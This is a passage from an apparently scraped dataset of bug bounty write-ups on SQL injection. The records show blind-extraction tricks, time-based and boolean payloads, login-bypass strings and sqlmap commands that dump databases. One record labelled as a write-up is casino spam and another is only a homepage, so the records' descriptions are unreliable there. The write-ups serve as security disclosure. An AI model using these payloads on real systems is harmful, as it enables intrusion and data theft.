row into the currently running query. It was possible to do error based Injection in case of MySQL but It was PostgreSQL DBMS this time. I tried to search a lot for workarounds this but found none. Another thing that was possible was, Stacked/Batched Queries but sadly even ; (semi-colon) was escaped and I couldn’t inject that as well. Soon after this, I contacted my friend none other than @securityidiots and he came up with an amazing trick which I’m going to share right now. Although it was application dependent It could be possible at various other places. Exploit First of all, using Burp Intruder I created around 200 Albums (you will know below that only 127 was needed but why not!) I decided to first extract the first character of the DBMS Version so I used inbuilt substr function and put my SQL Query inside it such that it became Select * from tbl_albums where page=2 order by album_date asc LIMIT 0,substr((select version()),1,1) but obviously it threw an error because the DBMS expects the value of LIMIT and OFFSET to be numeric! Next, we used \" ascii \" function to convert the result of the substr function to a number so the query looked something like Select * from tbl_albums where page=2 order by album_date asc LIMIT 0,ascii(substr((Select version()),1,1)) Now the query was perfectly fine and returned no errors, now what this query will do is, return that number of albums which is equivalent to the ascii value of first character of version() function’s output. That was the reason to create so many albums in the step #1 since the result would be in the range of 0-127. Example: If the output of version() was PostgreSQL 9.6.2 then substr((select version()),1,1) would be “P” ascii(substr((select version()),1,1)) would be \" 80 \" Therefore, only 80 albums would be returned to the page substr((select version()),2,1) would be “o” ascii(substr((select version()),2,1)) would be \" 111 \" only 111 albums would be returned to the page and Similarly, we can move ahead. so all we have to do now is count the number of albums returned in the DOM using some javascript and convert the count of albums back to the equivalent Character in ASCII Table and we got our first character of (select version()) and similarly we could go further to extract all DBMS by automating it. I used document.querySelectorAll('.ALBUM_CLASS').length to find the number of albums returned and Converted them back to Character using String.fromCharCode(80) Though, this was enough for the POC. I hope you guys enjoyed the writeup as it was extremely fun exploiting it! Share Get link Facebook X Pinterest Email Other Apps Comments Anonymous 26 July 2019 at 16:36 This is genius!! Thanks for sharing :) Reply Delete Replies Reply Zin Min Phyo 19 August 2020 at 20:02 Thanks guys Reply Delete Replies Reply Oznc 31 August 2020 at 08:23 Amazing! Well done Reply Delete Replies Reply Add comment Load more... Post a Comment Popular Posts November 08, 2017 Local File Read via XSS in Dynamically Generated PDF Share Get link Facebook X Pinterest Email Other Apps 23 comments Powered by Blogger Theme images by Matt Vince Rahul Maini Application Security Engineer and a Bug Bounty Hunter currently active on Bugcrowd. Interested in learning Binary Exploitation and Reverse Engineering! Follow me @iamnoooob Visit profile Archive December 2019 1 July 2019 1 July 2018 1 November 2017 1 September 2017 1 Report Abuse"}
{"source_url": "https://medium.com/@frycos/finding-sql-injections-fast-with-white-box-analysis-a-recent-bug-example-ca449bce6c76", "title": "Finding SQL injections fast with white-box analysis — a recent bug example | by frycos | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@frycos/finding-sql-injections-fast-with-white-box-analysis-a-recent-bug-example-ca449bce6c76. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nFinding SQL injections fast with white-box analysis — a recent bug example | by frycos | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Finding SQL injections fast with white-box analysis — a recent bug example frycos 4 min read · Oct 13, 2019 -- 2 Listen Share On September 13rd I submitted a bug for Zoho’s OpManager product. It was fixed quite fast by the development team and a new version 12.4 (Build no 124089) was released on October 3rd ( CVE-2019–17602 ). This is a short story how I found this bug from a methodological perspective, especially regarding white-box analysis. In the last months I started to shift my focus from black-box testing to a more white-boxed approach. Reading code not only makes fun but rather gives insight into a more detailed understanding of bugs as well as a chance to find bugs with quite some preconditions. Since Java (and other languages of course) “compiles” into byte-code, it can easily be decompiled back into it’s source. So I downloaded (more or less randomly) the latest ManageEngine OpManager from their website and decompiled all JAR files for a deeper white-box analyses. So besides decompilation of code, how is a standard Java web application structured? From an attacker’s perspective there is not only code but also configuration files (.xml, .properties, etc.). Especially, for Java web applications several configurations are done within the file web.xml . For a deployed web application, it’s usually stored in the protected WEB-INF directory. So how could this file help us? E.g. one can read how Java files/classes are used and mapped to URLs. Of special interested to us are so called Servlets . These special classes have methods like doGet or doPost which are executed for every request matching their URL mapping pattern defined in web.xml . So the methodology tells us to go through all Servlets, look (at least) at their do* methods and find some vulnerabilities from there. This approach is somehow top-down, from user-controlled input to bad things in the backend. After digging into some Servlets, I found one called OPMDeviceDetailsServlet . The web.xml file told us that it’s URL maps to /servlet/APMExtAlertsInteg . Press enter or click to view image in full size And this is were white-box analysis comes into play. We can follow the control flow step-by-step which easily allows us to submit proper parameters per request, fulfilling several conditional branches observable in the source code. Here, we see the Servlet entry point calling the doPost methods. The Servlet can be called from and unauthenticated and authenticated perspective which makes it more or less critical . For this article we concentrate on the authenticated part. Press enter or click to view image in full size We observe that the allow variable has to be true such that with a proper combination of Servlet URL parameters, one could reach the code of the getXMLFileforAllDevices method. Namely, the fetchType parameters has to be set to the value deep , and userName , password and domainName have to be set accordingly. The timeVal parameters does not have to be set explicitly since if it is null , it is set to All programmatically. In the end, the getAllMOs method will be called. Press enter or click to view image in full size Now, the getAllMO method is used to build and execute an SQL query parameterized with category . Since this SQL query is built dynamically via String concatenation, malicious code could be injected easily. Press enter or click to view image in full size The exploitation step is as simple as injecting something like …&category=nocategory’); [NEW QUERY — . The screenshots below show a simple example of a pg_sleep(10) selection. Since the bundled database usually is PostgreSQL, stacked queries make injection easy and with e.g. help of COPY TO commands a web shell could be written. UDF reverse shells would also be possible, i.e. Remote Code Execution is just a matter of small additional effort and left to the interested reader. Press enter or click to view image in full size Press enter or click to view image in full size Additionally, the encryption routine for the username and password had to be re-implemented for a proper decrypt call at the Servlet’s entry point. Since the key is fixed (not good!), the routine was re-implemented quickly. Overall, this short article should make you being interested in a white-box analysis approach if you get a chance to access code. Instead of fuzzing parameters, sometimes a short code analysis can reveal a straight-forward exploitation. From beginning of code reading to a first successful exploitation, it took me approx. an hour (and I’m far from being an expert!). I hope you enjoyed this walk-through of this very recent and real-world example how to find a critical bug in well-known product. It’s as easy as that! Vulnerability White Box Testing Source Code Analysis Bug Hunting -- -- 2 Written by frycos 255 followers · 1 following Red Teamer @frycos Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@ariffadhlullah2310/sql-injection-bug-bounty-110e92e71ec3", "title": "SQL Injection Bug Bounty POC!. Good Dayyy Everyone, | by Arif-ITSEC111 | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@ariffadhlullah2310/sql-injection-bug-bounty-110e92e71ec3. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSQL Injection Bug Bounty POC!. Good Dayyy Everyone, | by Arif-ITSEC111 | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in SQL Injection Bug Bounty POC! Arif-ITSEC111 2 min read · Jul 11, 2019 -- 3 Listen Share Good Dayyy Everyone, in a few days ago, i try to join with a bug bounty program and i try to search the program still running and managed. i found **** program FYI the target is european search engine. Like google or something. i guess the target is on france The scope is : *.xxxx.com Ok we go to the point i found the vulnerability is on api.xxx.com This is the raw that i got on burp GET /api/trend/get?locale=en_GB&device=desktop&uiv=4 HTTP/1.1 Host: api.xxxx.com Content-Type: application/x-www-form-urlencoded Origin: https://www.xxx.com Connection: close blablabla This is my payload : locale=en_GB’) AND 1234=(SELECT (CASE WHEN (1234=1234) THEN 1234 ELSE (SELECT 4376 UNION SELECT 4107) END)) — BWMI&device=desktop&uiv=4 i save the raw into the notepad as .txt format i run my sqlmap from my terminal (because i used mac. i use this only sqlmap -r /xxx/xxx/xxx/files.txt — dbs i got something cool stuff there i got the database and i try to get more than the dbs. i try to check the table first using this sqlmap -r /xxx/xxx/xxx/files.txt -D xxx — table i found a lot of table there but there is something interesting for me. Then i try to get the columns sqlmap -r /xxx/xxx/xxx/files.txt -D xxx -T xxx — columns i got the columns. very interesting then i try to got the field of DB TADAAAA i GOT what i want . Press enter or click to view image in full size ehehehehe…. Create a report, and submit the report - status on review, then status changed to accepted, then solved now 2 July 2019 — report 2 July 2019 — accepted 9 July 2019 — ask for verification or retest 9 July 2019 — solved 2019–07–12 13:53:51 5000EURO BOUNTY HAS COMING Press enter or click to view image in full size Press enter or click to view image in full size Bug Bounty Sql Sql Injection Poc -- -- 3 Written by Arif-ITSEC111 130 followers · 7 following Not All My Finding Disclose Here. But Trust me, I found a lot more than you thought CISM,CEH,CHFI,CCNP,IBM Certified. Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@kgaber99/sql-injection-in-forget-password-function-3c945512e3cb", "title": "SQL Injection in Forget Password Function | by khaled gaber | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@kgaber99/sql-injection-in-forget-password-function-3c945512e3cb. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSQL Injection in Forget Password Function | by khaled gaber | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in SQL Injection in Forget Password Function khaled gaber 3 min read · Jul 18, 2019 -- 3 Listen Share This is my first time on Medium and I wanted to share with you my first SQL injection bug reported to a private bug bounty program let’s name it “example.com” which I discovered in forget password function which I usually look for logical bugs in this function instead of SQLi. Enumeration Phase First, try to test the normal behavior of any function before starting to manipulate the input parameters or thinking of how to abuse it, this will make your hunting life much easier and identify the bugs much faster. Testing the normal behavior by submitting an already existed user email and the response was Press enter or click to view image in full size And when submitting an email like “idontexist@test.com” the response was Press enter or click to view image in full size Now the time comes for our SQLi testing. first, I tried to end my input with a single quote and the response was “Unable to access data” which was very suspicious. Knowing that when single quote repeated twice is treated as a literal character, not a special one, I ended my input with two single quotes like [ test@test.com ’’ ], Then we had the normal response of the non-existed mail and this was close to prove that this function is vulnerable to SQLi. Also, this clarifies the importance of understanding the application’s behavior and normal response messages. One of the most important web application enumeration steps is to identify the back-end language and technologies and this sometimes leads to expecting the DBMS engine. From web page extensions like “RetrievePassword.aspx”, the pentester identified that back-end language is “ASP.NET” which always comes with MSSQL server as a DBMS engine. This little piece of information made the exploitation very easy to craft targeted payloads. Exploitation Phase: The basic SQLi exploitation steps are to break the query which we did with single quotes then fix the query with a comment character, then inject anything in between. After trying a couple of payloads and special characters we were able to inject and fix our query with a payload like the following one [ test@test.com ’) — ] Now I can finally exploit this SQLi vulnerability and started with a simple technique called “Time-Based” which delays the database server responses with a specific amount of time. (WAIT FOR DELAY ‘hh:mm:ss’) is a MSSQL function that suspends the execution for the specified amount of time as a PoC I was able to delay database server responses up to 30 seconds using the following payload [ anyInput’) WAITFOR DELAY ‘0:0:30’ — ] Attack Automation: Since it’s a Time-Based SQLi, it’s very hard to make the exploitation and data exfiltration manually and here “SQLMap” comes to rescue to automate this process. Submit this vulnerable request and intercept it with “Burp Suite” proxy tool, replace the “E-mail” value with an “*” to be detected by SQLMap as a custom injection point, and save this request. After a couple tries with SQLMap options, the final command that was used to exploit this SQLi and extract the Database names was: Press enter or click to view image in full size Press enter or click to view image in full size The next steps are to identify the application database then tables and columns then dump data of the juicy columns like usernames, emails, and passwords which were saved as a clear-text format. Security Sql Injection Bug Bounty Time Based -- -- 3 Written by khaled gaber 139 followers · 4 following Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@saadahmedx/sql-injection-c87a390afdd3", "title": "SQl Injection. Hy Guy’s this write up is all about my… | by Saad Ahmed | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@saadahmedx/sql-injection-c87a390afdd3. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSQl Injection. Hy Guy’s this write up is all about my… | by Saad Ahmed | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in SQl Injection Saad Ahmed 2 min read · Jun 17, 2019 -- 3 Listen Share Hy Guy’s this write up is all about my SQL Injection that I found in PRIVATE program running on BugCrowd let assume website name subdomain.private.com/registro/login. when i visit the site I saw the strange behavior this is the admin panel & the website reload it self again & again so I turn on the intercept & capture the request and tried basic bypass eg admin:admin, 1'or’1'=’1 but didn’t work there is two parm _email and _pass I put in ’ _email parm & nothing happen but accidentally put ‘ in both _email & _pass and I got <b>Warning</b>: PDOStatement::execute(): SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near… Press enter or click to view image in full size SQl Conform :D I tried to exploit further but failed there is WAF that block me to do further injection and them I remember our Awsm OLD facebook group of WEB INJECTORS https://www.facebook.com/groups/webinj3ct0rs/ where we try our best to solve Challenges ;) Still remember those golden days the group having there website with name http://www.securityidiots.com and then I am reading the SQL Injection at login panel http://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html & found a bypass ' OR 1=1 /* it didn’t bypass the login and give me access instead of server disclose the password variable contain the password :V Press enter or click to view image in full size Simple reported the issue to the team & this replay Press enter or click to view image in full size I hope you guys like it :) ./Logout Security -- -- 3 Written by Saad Ahmed 636 followers · 1 following Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@frostnull1337/sql-injection-through-user-agent-44a1150f6888", "title": "SQL injection through User-Agent. Hi everyone, in this simple tutorial I… | by fr0stNuLL | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@frostnull1337/sql-injection-through-user-agent-44a1150f6888. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSQL injection through User-Agent. Hi everyone, in this simple tutorial I… | by fr0stNuLL | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in SQL injection through User-Agent fr0stNuLL 4 min read · May 8, 2019 -- 7 Listen Share Hi everyone, in this simple tutorial I will describe how I was able to exploit a SQL injection, using the user-agent as vector. First of all, I will leave “blur” in the sensitive parts as it was requested from the customer of the private program. After authenticating in the application I came across the following request: Press enter or click to view image in full size After, try several things .. and application always return “OK” in the response .. I put a single quote (‘) in the U ser-Agent Header .. result, instead of the application return 200 OK, returned 401 .. as demonstrated below: Press enter or click to view image in full size Next step was trying to exploit some SQL injection payloads, after a few tries it sees that the application was vulnerable to a type of SQL injection Boolean based . Putting the tests into practice, when the payload ‘ AND’ 1 ‘=’ 1 was inserted into the User-Agent the application returned 200 OK, when the payload ‘ AND’ 1 ‘=’ 2 was entered the application returned 401. The images below illustrate the fact: Press enter or click to view image in full size Press enter or click to view image in full size After confirming that the application was vulnerable, the next step was to try to verify which version of the database the application was using. For this, I have tested functions of the Oracle , MySQL , MicrosoftSQL etc. databases. Finally, through the payload ‘ and substring(@@version,1,1)=1=’1'’, it was possible to identify that the database was MySQL or MariaDB. The images bellow show the fact: OBS: if you don’t know what the function substring here you can found :) Press enter or click to view image in full size Press enter or click to view image in full size After iterates the values of substring function i got the version i it was 10.1.21 Mariadb. A cool trick when you find a Boolean based , is to test if there is a possibility of using a “ subselect ”, in my case it was possible. Press enter or click to view image in full size To get the name of the table, it is necessary to make a wordlist with some familiar names and it is also cool, to make a wordlist with the name of the company. Through the following payload ‘ AND (select 1 from “WORDLIST” limit 0,1)=1+‘ , it was possible to get the name of the table “ app_user ”, see that in the image the below is returned 200 OK in the response of the server. Press enter or click to view image in full size Now, that we have the name of the table, we go behind the name of the columns so we can get the user and the password. In the same way that it was exploited to get the table name, an attempt / error is also used here with common names used in colums such as user, password, user_pass, passwd, etc. The following images illustrate the name of the retrieved columns. Press enter or click to view image in full size Press enter or click to view image in full size Finally, the following payload looks for the “password” column in the “app_user” table where the user id is equal to ‘X’ and brings the user password in the application. Press enter or click to view image in full size Return 200 “OK” for user id 971 Press enter or click to view image in full size Return 401 for user id 972 This is all personal, I can not show the rest with the passwords in the application because it would violate some terms :) any doubt we are together. Sharing is Caring :) Bug Bounty Pentesting Hacking -- -- 7 Written by fr0stNuLL 318 followers · 3 following scr1pt k1dd13 and n00b sec researcher. Responses ( 7 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.mohamedharon.com/2019/07/sql-injection-in-private-sitecomloginphp.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2019/07/sql-injection-in-private-sitecomloginphp.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://robinverton.de/blog/2019/08/25/bug-bounty-bypassing-a-crappy-waf-to-exploit-a-blind-sql-injection/", "title": "Robin Verton - developer, software engineer and red teamer", "friendly_explanation": "This is a bug bounty writeup from https://robinverton.de/blog/2019/08/25/bug-bounty-bypassing-a-crappy-waf-to-exploit-a-blind-sql-injection/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nRobin Verton - developer, software engineer and red teamer rv blog security TIL uses Hey! I'm Robin. I'm a deeply technical software engineer and security expert , currently self-employed , previously worked as a red teamer & pentester at Deutsche Telekom AG. Automations and integrations Full-stack web applications Cloud solutions (with AWS) Security tools and infrastructure Penetration testing and red teaming Source code auditing I strive for simplicity and quality . Mostly writing Go, Elixir and JavaScript . 3x AWS certified and 2x Offensive Security certified. open source pgjobs go postgres job queue blueprint tevents go private event logger and job monitor for tailnets webanalyze go uncovers technologies used on websites hntr go nextjs collaborative workspaces for recon data smbwatch go fast samba fileshare indexing wonitor go fast, zero config web endpoint change monitor pipers go task automation framework redAsset go subdomain enumeration by parsing FDNS dumps and CA transparency logs gxss go blind XSS service alerting over slack or email to github profile → sideprojects CampingBroetchen (sold 2023) Digital (breakfast) ordering for camping places (SaaS) Visit → Kursbuddy (closed 2021) (Sport-) course and member management (SaaS) Visit → latest posts 2024-01-02 Improved validation with generics in Go go 2023-02-28 tevents: event logger and job monitor for tailnets go tailscale 2022-08-22 Queueing with PostgreSQL and Go go postgres 2022-02-13 hntr, shareable workspaces for target data security go postgres 2020-08-20 Push to deploy a Python (Django) service via Github Actions python devops 2020-05-15 Smuggling HTTP headers through reverse proxies security 2019-08-25 Bug Bounty: Bypassing a crappy WAF to exploit a blind SQL injection security bugbounty 2018-07-05 Re-using socket FDs vs reverse shell ctf security 2018-06-22 Django Vue.js integration as a widget django vue 2017-07-15 Setting up my new Chromebook with linux linux Mail • Twitter • Github • Imprint • robinverton.de, 2025"}
{"source_url": "https://medium.com/@orthonviper/sql-injection-for-50-bounty-but-still-worth-reading-468442c1cc1a", "title": "SQL injection for $50 bounty, but still worth reading!! | by Sunil Yedla | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@orthonviper/sql-injection-for-50-bounty-but-still-worth-reading-468442c1cc1a. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSQL injection for $50 bounty, but still worth reading!! | by Sunil Yedla | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in SQL injection for $50 bounty, but still worth reading!! Sunil Yedla 2 min read · Mar 10, 2019 -- 2 Listen Share Hey guyzz …!!! I hope you all are doing well. Today I’m fully disclosing a PoC demonstration along with some brief documentation of this exploit. This is a writeup of bug which I found in one of the private programs of Hackerone. Since it is a private program i can’t disclose the name of the program(please note that, i will be referring the program name as : “ Redacted ” throughout this article). I found SQL injection, in one of their endpoints: “/rest/aom/index?id=” I’ve been investigating this program since many days and i always end up finding low severity bugs. One day while while loading a url : https://www. redacted .com/aom?utm_source=Frontpage&utm_medium=banner%20popup&utm_campaign=Frontpage%20popup%20June17%20AOM , found an endpoint where I’ve seen id parameter. Old/Basic trick ( ‘ after the ID value ) worked and that is how i found my first sql injection 2 years ago. Below are the complete steps of reproduction. Steps to reproduce : loaded the url : https://www. redacted 